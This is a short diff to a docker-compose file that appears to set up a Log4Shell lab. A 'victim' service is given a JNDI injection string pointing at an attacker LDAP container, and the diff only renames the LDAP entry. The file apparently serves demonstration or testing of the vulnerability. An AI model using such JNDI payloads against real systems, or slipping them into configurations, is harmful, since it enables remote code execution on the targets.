@@ -10,7 +10,7 @@ services:
         APP_NAME: "victim"
     environment:
       JAVA_OPTS: >-
-        -Dvictim-payload=$${jndi:ldap://attacker_ldap_registry:1389/cn=serialized-class,dc=ldap-registry,dc=attacker}
+        -Dvictim-payload=$${jndi:ldap://attacker_ldap_registry:1389/cn=made-class,dc=ldap-registry,dc=attacker}
     depends_on:
       - attacker_ldap_registry
       - attacker_ldap_registry_setup
